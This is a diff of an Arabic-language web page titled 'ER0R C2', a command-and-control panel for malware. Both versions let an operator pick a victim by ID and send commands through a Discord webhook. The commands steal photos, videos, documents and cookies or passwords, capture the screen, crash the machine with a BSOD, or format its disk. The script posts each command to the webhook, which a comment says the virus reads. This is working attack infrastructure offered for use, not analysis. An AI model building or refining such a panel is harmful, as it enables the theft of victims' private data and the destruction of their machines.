@@ -2,105 +2,65 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ER0R C2 - COMMAND CENTER v3</title>
+    <title>ER0R C2 - ULTIMATE CONTROL</title>
     <style>
-        :root { --neon: #6001d2; --dark: #0b0b0b; --text: #00ff41; }
-        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .container { width: 100%; max-width: 900px; background: #151515; border: 2px solid var(--neon); border-radius: 15px; padding: 25px; box-shadow: 0 0 20px rgba(96, 1, 210, 0.3); }
-        h1 { color: var(--neon); text-align: center; font-size: 28px; text-shadow: 0 0 10px var(--neon); }
-        .target-box { background: #000; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-bottom: 25px; text-align: center; }
-        input { background: #111; border: 1px solid var(--neon); color: #fff; padding: 12px; width: 280px; text-align: center; border-radius: 5px; font-size: 16px; }
-        
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-        .section { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 10px; }
-        .section h3 { margin-top: 0; color: var(--neon); font-size: 16px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        
-        .btn { background: transparent; border: 1px solid var(--neon); color: #fff; padding: 12px; width: 100%; margin: 8px 0; cursor: pointer; border-radius: 5px; font-weight: bold; transition: 0.3s; }
-        .btn:hover { background: var(--neon); box-shadow: 0 0 15px var(--neon); }
-        .btn-danger { border-color: #ff0000; color: #ff0000; }
-        .btn-danger:hover { background: #ff0000; color: #fff; box-shadow: 0 0 15px #ff0000; }
-
-        #terminal { background: #000; border: 1px solid #333; height: 180px; margin-top: 25px; padding: 15px; border-radius: 8px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 13px; color: var(--text); }
-        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 3px; }
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; padding: 20px; }
+        .panel { border: 2px solid #6001d2; padding: 20px; border-radius: 10px; max-width: 900px; margin: auto; box-shadow: 0 0 20px #6001d2; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+        .box { border: 1px solid #333; padding: 15px; border-radius: 5px; background: #0a0a0a; }
+        .btn { background: none; border: 1px solid #6001d2; color: #fff; padding: 12px; cursor: pointer; width: 100%; margin: 5px 0; transition: 0.3s; }
+        .btn:hover { background: #6001d2; box-shadow: 0 0 10px #6001d2; }
+        .danger { border-color: red; color: red; }
+        .danger:hover { background: red; color: white; }
+        #term { background: #000; border: 1px solid #222; height: 150px; overflow-y: auto; margin-top: 20px; padding: 10px; color: #0f0; }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <h1>📟 نظام التحكم والسيطرة ER0R v3</h1>
-        
-        <div class="target-box">
-            <label>🎯 رقم الـ ID للهدف (من الديسكورد):</label><br><br>
-            <input type="text" id="targetID" placeholder="مثلاً: ID-4822">
+    <div class="panel">
+        <h1 style="text-align:center; color:#6001d2;">📟 مركز السيطرة المطلقة ER0R V3</h1>
+        <div style="text-align:center; margin-bottom:20px;">
+            <input type="text" id="targetID" placeholder="أدخل ID الضحية" style="padding:10px; width:250px; background:#111; border:1px solid #6001d2; color:#fff;">
         </div>
 
         <div class="grid">
-            <div class="section">
-                <h3>📂 سحب البيانات</h3>
-                <button class="btn" onclick="executeCommand('سحب الصور')">🖼️ سحب الصور</button>
-                <button class="btn" onclick="executeCommand('سحب ملفات سطح المكتب')">📄 سحب المستندات</button>
+            <div class="box">
+                <h3>📂 سحب واستخراج</h3>
+                <button class="btn" onclick="send('سحب الصور')">🖼️ سحب كافة الصور</button>
+                <button class="btn" onclick="send('سحب الفيديو')">🎥 سحب الفيديوهات</button>
             </div>
-
-            <div class="section">
-                <h3>👁️ المراقبة الحية</h3>
-                <button class="btn" onclick="executeCommand('تصوير الشاشة')">🖥️ لقطة شاشة</button>
-                <button class="btn" onclick="executeCommand('سحب الباسوردات')">🔑 سحب الكوكيز</button>
-            </div>
-
-            <div class="section">
-                <h3>☢️ العمليات التدميرية</h3>
-                <button class="btn btn-danger" onclick="executeCommand('شاشة الموت')">💀 شاشة الموت (BSOD)</button>
-                <button class="btn btn-danger" onclick="executeCommand('فرمتة')">🔥 فرمتة الجهاز</button>
+            <div class="box">
+                <h3>🎮 تحكم ومراقبة</h3>
+                <button class="btn" onclick="send('تصوير الشاشة')">📸 تصوير الشاشة</button>
+                <button class="btn" onclick="send('إظهار واجهة التحكم')">📟 إظهار GUI للضحية</button>
             </div>
         </div>
 
-        <div id="terminal">
-            <div class="log-entry">> [SYSTEM] Waiting for commands...</div>
+        <div class="box" style="margin-top:20px; text-align:center;">
+            <h3 style="color:red;">☢️ أوامر النظام القاتلة</h3>
+            <button class="btn danger" onclick="send('فرمتة')">🔥 فرمتة شاملة للجهاز</button>
         </div>
+
+        <div id="term">> System Ready... Waiting for Command.</div>
     </div>
 
     <script>
-        async function executeCommand(action) {
+        async function send(cmd) {
             const id = document.getElementById('targetID').value;
-            const terminal = document.getElementById('terminal');
+            if(!id) return alert("أدخل ID الهدف!");
+            
+            const term = document.getElementById('term');
+            term.innerHTML += `<br>> Sending [${cmd}] to ${id}...`;
 
-            if (!id) {
-                logToTerminal("خطأ: يرجى إدخال ID الضحية!", "red");
-                return;
-            }
+            const res = await fetch('./data.json');
+            const config = await res.json();
 
-            logToTerminal(`جاري إرسال أمر: [${action}] إلى الهدف: ${id}...`, "yellow");
-
-            try {
-                // جلب رابط الويب هوك من الملف الإعدادات
-                const configRes = await fetch('./data.json');
-                const config = await configRes.json();
-
-                // إرسال الأمر للديسكورد لكي يقرأه الفيروس
-                const response = await fetch(config.webhook_url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `⚠️ **أمر تحكم:**\nالهدف: \`${id}\`\nالأمر المطلوب: **${action}**`
-                    })
-                });
-
-                if (response.ok) {
-                    logToTerminal(`✅ تم تسليم الأمر بنجاح. راقب قناة الديسكورد للنتائج.`, "#00ff41");
-                } else {
-                    logToTerminal("❌ فشل في تسليم الأمر. تحقق من الويب هوك.", "red");
-                }
-            } catch (error) {
-                logToTerminal("❌ خطأ في الاتصال بالسيرفر!", "red");
-            }
-        }
-
-        function logToTerminal(message, color) {
-            const terminal = document.getElementById('terminal');
-            const date = new Date().toLocaleTimeString();
-            terminal.innerHTML += `<div class="log-entry" style="color: ${color}">> [${date}] ${message}</div>`;
-            terminal.scrollTop = terminal.scrollHeight;
+            await fetch(config.webhook_url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `⚠️ **أمر تحكم:**\nالهدف: \`${id}\`\nالأمر: **${cmd}**` })
+            });
+            term.innerHTML += `<br>> ✅ Command Sent successfully.`;
+            term.scrollTop = term.scrollHeight;
         }
     </script>
 </body>
